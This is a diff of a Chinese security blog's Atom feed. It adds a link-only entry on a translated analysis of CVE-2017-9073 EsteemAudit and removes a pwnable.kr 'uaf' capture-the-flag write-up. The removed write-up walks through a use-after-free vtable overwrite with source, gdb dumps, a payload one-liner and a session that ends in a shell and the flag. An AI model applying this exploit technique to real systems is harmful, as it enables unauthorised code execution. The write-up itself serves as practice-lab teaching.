@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://weaponx.site/"/>
-  <updated>2017-06-07T10:16:05.390Z</updated>
+  <updated>2017-07-13T05:41:35.901Z</updated>
   <id>http://weaponx.site/</id>
   
   <author>
@@ -14,6 +14,31 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2017-9073 EsteemAudit分析[翻译自趋势科技]</title>
+    <link href="http://weaponx.site/2017/07/13/CVE-2017-9073-EsteemAudit%E5%88%86%E6%9E%90-%E7%BF%BB%E8%AF%91%E8%87%AA%E8%B6%8B%E5%8A%BF%E7%A7%91%E6%8A%80/"/>
+    <id>http://weaponx.site/2017/07/13/CVE-2017-9073-EsteemAudit分析-翻译自趋势科技/</id>
+    <published>2017-07-13T05:40:32.000Z</published>
+    <updated>2017-07-13T05:41:35.901Z</updated>
+    
+    <content type="html"><![CDATA[<p>文章已经投稿至360播报。</p>
+<p><a href="http://bobao.360.cn/learning/detail/3937.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3937.html</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;文章已经投稿至360播报。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://bobao.360.cn/learning/detail/3937.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bobao.360.cn/learning/
+    
+    </summary>
+    
+      <category term="安全" scheme="http://weaponx.site/categories/%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="漏洞" scheme="http://weaponx.site/tags/%E6%BC%8F%E6%B4%9E/"/>
+    
+  </entry>
   
   <entry>
     <title>NETBIOS主机名编码算法</title>
@@ -28,7 +53,7 @@
 <p>经过查阅资料发现NETBIOS对主机名的编码方式如下：</p>
 <p>1.将字符补齐到16字节，不够的用空格补<br>2.将每个字符拆成高4bit和低4bit<br>3.再用0x41就是A加上这个值</p>
 <p>举个例子<code>abcd</code>的编码流程：<br>1.补空格到16字节</p>
-<figure class="highlight 1c"><table><tr><td class="code"><pre><div class="line"><span class="string">"abcd                "</span></div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="string">"abcd                "</span></div></pre></td></tr></table></figure>
 <p>2.将每个字符拆开</p>
 <figure class="highlight lsl"><table><tr><td class="code"><pre><div class="line">拆分前</div><div class="line"><span class="number">0x61</span> <span class="number">0x62</span> <span class="number">0x63</span> <span class="number">0x64</span> <span class="number">0x20</span> <span class="number">0x20</span> <span class="number">0x20</span> <span class="number">0x20</span> <span class="number">0x20</span> ...</div><div class="line"></div><div class="line">拆分后</div><div class="line"><span class="number">0x6</span> <span class="number">0x1</span> <span class="number">0x6</span> <span class="number">0x2</span> <span class="number">0x6</span> <span class="number">0x3</span> <span class="number">0x6</span> <span class="number">0x4</span> <span class="number">0x2</span> <span class="number">0x0</span> <span class="number">0x2</span> <span class="number">0x0</span></div></pre></td></tr></table></figure>
 <p>3.用0x41加上这个值</p>
@@ -858,67 +883,6 @@
       <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
     
       <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>uaf Writeup[pwnable.kr]</title>
-    <link href="http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/"/>
-    <id>http://weaponx.site/2017/02/15/uaf-writeup-pwnable-kr/</id>
-    <published>2017-02-15T14:20:26.000Z</published>
-    <updated>2017-03-10T04:55:09.181Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0x00-UAF"><a href="#0x00-UAF" class="headerlink" title="0x00 UAF"></a>0x00 UAF</h2><p>UAF(Use After Free)释放后重用，其实是一种指针未置空造成的漏洞。在操作系统中，为了加快程序运行速度，如果释放一块n字节大小的内存空间，当申请一块同样大小的内存空间时，会将刚刚释放的内存空间重新分配。如果指向这块内存空间的指针没有置空，会造成一系列的问题。</p>
-<a id="more"></a>
-<h2 id="0x01-fastbin"><a href="#0x01-fastbin" class="headerlink" title="0x01 fastbin"></a>0x01 fastbin</h2><p>fastbin顾名思义，fast就是要快。所以fastbin旨在加快操作系统的内存分配速度，fastbin仅使用fd形成单链表的形式，且遵循LIFO原则。</p>
-<p>当操作系统分配一块较小的内存时(64字节)，会首先从从fastbin中寻找未使用的chunk并分配。</p>
-<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span> </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">class</span> Human&#123;</div><div class="line"><span class="keyword">private</span>:</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>&#123;</div><div class="line">        system(<span class="string">"/bin/sh"</span>);</div><div class="line">    &#125;</div><div class="line"><span class="keyword">protected</span>:</div><div class="line">    <span class="keyword">int</span> age;</div><div class="line">    <span class="built_in">string</span> name;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">    &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">class</span> Man: <span class="keyword">public</span> Human&#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">    Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</div><div class="line">            <span class="keyword">this</span>-&gt;name = name;</div><div class="line">            <span class="keyword">this</span>-&gt;age = age;</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</div><div class="line">        Human::introduce();</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">        &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="keyword">class</span> Woman: <span class="keyword">public</span> Human&#123;</div><div class="line"><span class="keyword">public</span>:</div><div class="line">        Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age)&#123;</div><div class="line">            <span class="keyword">this</span>-&gt;name = name;</div><div class="line">            <span class="keyword">this</span>-&gt;age = age;</div><div class="line">        &#125;</div><div class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>&#123;</div><div class="line">            Human::introduce();</div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">        &#125;</div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</div><div class="line">    Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</div><div class="line">    Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</div><div class="line"></div><div class="line">    <span class="keyword">size_t</span> len;</div><div class="line">    <span class="keyword">char</span>* data;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</div><div class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</div><div class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</div><div class="line">        <span class="built_in">cin</span> &gt;&gt; op;</div><div class="line"></div><div class="line">        <span class="keyword">switch</span>(op)&#123;</div><div class="line">            <span class="keyword">case</span> <span class="number">1</span>:</div><div class="line">                m-&gt;introduce();</div><div class="line">                w-&gt;introduce();</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">2</span>:</div><div class="line">                len = atoi(argv[<span class="number">1</span>]);</div><div class="line">                data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</div><div class="line">                read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</div><div class="line">                <span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">case</span> <span class="number">3</span>:</div><div class="line">                <span class="keyword">delete</span> m;</div><div class="line">                <span class="keyword">delete</span> w;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">            <span class="keyword">default</span>:</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>通过分析题目源代码，看到各个操作的含义</p>
-<ol>
-<li>调用</li>
-<li>分配内存</li>
-<li>释放内存</li>
-</ol>
-<p>大概的思路是通过3先释放内存，因为程序释放内存后没有将指针置空。故在重新分配时会出现UAF。</p>
-<h2 id="0x03-Solution"><a href="#0x03-Solution" class="headerlink" title="0x03 Solution"></a>0x03 Solution</h2><p>这个题目涉及C++程序的逆向，我们可以</p>
-<p>看一下C++中的继承是怎么体现的，以Man为例<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">void</span> __fastcall Man::Man(Man *<span class="keyword">const</span> <span class="keyword">this</span>, <span class="built_in">std</span>::<span class="built_in">string</span> name, <span class="keyword">int</span> age)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// ST0C_4@1</span></div><div class="line"></div><div class="line">  v3 = age;</div><div class="line">  Human::Human(&amp;<span class="keyword">this</span>-&gt;baseclass_0);</div><div class="line">  <span class="keyword">this</span>-&gt;baseclass_0._vptr.Human = (<span class="keyword">int</span> (**)(...))&amp;off_4015B0;</div><div class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>=(&amp;<span class="keyword">this</span>-&gt;baseclass_0.name, name._M_dataplus._M_p);</div><div class="line">  <span class="keyword">this</span>-&gt;baseclass_0.age = v3;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>先new了一个Human的类，在修改这个类的虚表(vptr)为Man类的虚表，最后给类的成员变量赋值。</p>
-<p>可以看到这个对象m所占的内存空间为<code>8(vptr) + 8(int[age]) + 8(ptr[name]) = 24</code>字节。知道了m对象所占的内存空间，下面需要观察内存空间的布局。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ x/3gx m</div><div class="line">0x603040:   0x0000000000401610  0x0000000000000019</div><div class="line">0x603050:   0x0000000000603028</div><div class="line">gdb-peda$ x/3gx 0x0000000000401610</div><div class="line">0x401610 &lt;_ZTV3Man+16&gt;: 0x000000000040127e  0x00000000004013d8</div><div class="line">0x401620 &lt;_ZTV5Human&gt;:  0x0000000000000000</div><div class="line">gdb-peda$ x/s 0x0000000000603028</div><div class="line">0x603028:   <span class="string">"Jack"</span></div></pre></td></tr></table></figure>
-<p>m对象内存布局的示意图</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">+----------------+</div><div class="line">|     vtable     |&lt;--------------------+</div><div class="line">+----------------+                     |</div><div class="line">|     age        |                     |</div><div class="line">+----------------+                     |</div><div class="line">|     ptr name   |                     |</div><div class="line">+----------------+                     | </div><div class="line">        ^                              |</div><div class="line">        |                     +-----------------+</div><div class="line">+----------------+            | humen::getshell |</div><div class="line">|     <span class="string">"Jack"</span>     |            +-----------------+</div><div class="line">+----------------+            | men::introduce  |</div><div class="line">                              +-----------------+</div></pre></td></tr></table></figure>
-<p>在看一下在C++中，程序是如何调用虚函数的。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span> ( op == <span class="number">1</span> )</div><div class="line">&#123;</div><div class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD, _QWORD))m-&gt;_vptr.Human + <span class="number">1</span>))(m);</div><div class="line">  (*((<span class="keyword">void</span> (__fastcall **)(_QWORD))w-&gt;_vptr.Human + <span class="number">1</span>))(w);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>对应的C++代码</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">m-&gt;introduce();</div><div class="line">w-&gt;introduce();</div></pre></td></tr></table></figure>
-<p>可以看出是通过虚表的index来完成函数调用，所以要调用getshell函数需要把虚表指针的<code>base - 8</code>。</p>
-<p>看对方服务器上虚表的地址</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">gdb-peda$ x/3gx 0x11caca0</div><div class="line">0x11caca0:  0x0000000000401550  0x0000000000000015</div><div class="line">0x11cacb0:  0x00000000011cac88</div><div class="line">gdb-peda$ x/3gx 0x0000000000401550</div><div class="line">0x401550 &lt;_ZTV5Woman+16&gt;:   0x000000000040117a  0x0000000000401376</div><div class="line">0x401560 &lt;_ZTV3Man&gt;:    0x0000000000000000</div></pre></td></tr></table></figure>
-<p>可以看到，需要覆盖的虚表指针为<code>0x401550 - 0x8 = 0x401548</code>。只要将m对象的虚表指针覆盖为<code>0x401548</code>，再通过<code>m -&gt; introduce()</code>即可完成invoke shell。通过UAF可以完成m对象指向的内存空间的修改。</p>
-<p>但是，释放内存空间的过程是先释放m再释放w。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">delete</span> m;</div><div class="line"><span class="keyword">delete</span> w;</div></pre></td></tr></table></figure>
-<p>通过一次UAF只能修改w指向的内存空间，而在引用的时候却先引用了m指向的内存空间。</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">m-&gt;introduce();</div><div class="line">w-&gt;introduce();</div></pre></td></tr></table></figure>
-<p>这是m指向的内存空间已经被释放，会造成段错误。</p>
-<p>因为这块内存空间仅为24字节，所以属于fastbin。根据前面的知识，fastbin是一个LIFO的结构。所以我们只需要分配两次24字节的内存空间，第二次就会分配到之前被释放的m所指向的内存空间。所以需要运行两次分配空间的过程。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">uaf@ubuntu:/tmp$ python -c <span class="string">"print '\x48\x15\x40\x00\x00\x00\x00\x00'+'\x00'*16"</span> &gt; expuaf</div><div class="line">uaf@ubuntu:/tmp$ <span class="built_in">cd</span> </div><div class="line">uaf@ubuntu:~$ ./uaf 24 /tmp/expuaf</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">3</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">2</div><div class="line">your data is allocated</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">2</div><div class="line">your data is allocated</div><div class="line">1. use</div><div class="line">2. after</div><div class="line">3. free</div><div class="line">1</div><div class="line">$ ls</div><div class="line">flag  uaf  uaf.cpp</div><div class="line">$ cat flag</div><div class="line">yay_f1ag_aft3r_pwning</div><div class="line">$</div></pre></td></tr></table></figure>
-<p>后话：<br>因为堆是8字节对齐的，只要重新分配的内存在9-24字节之间就可以分配到之前释放的m和w。所以，程序第一个参数为9-24都可以，不过没有测试。有兴趣的朋友可以测试一下。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;0x00-UAF&quot;&gt;&lt;a href=&quot;#0x00-UAF&quot; class=&quot;headerlink&quot; title=&quot;0x00 UAF&quot;&gt;&lt;/a&gt;0x00 UAF&lt;/h2&gt;&lt;p&gt;UAF(Use After Free)释放后重用，其实是一种指针未置空造成的漏洞。在操作系统中，为了加快程序运行速度，如果释放一块n字节大小的内存空间，当申请一块同样大小的内存空间时，会将刚刚释放的内存空间重新分配。如果指向这块内存空间的指针没有置空，会造成一系列的问题。&lt;/p&gt;
-    
-    </summary>
-    
-      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
-    
-    
-      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
-    
-      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
-    
-      <category term="UAF" scheme="http://weaponx.site/tags/UAF/"/>
     
   </entry>
   
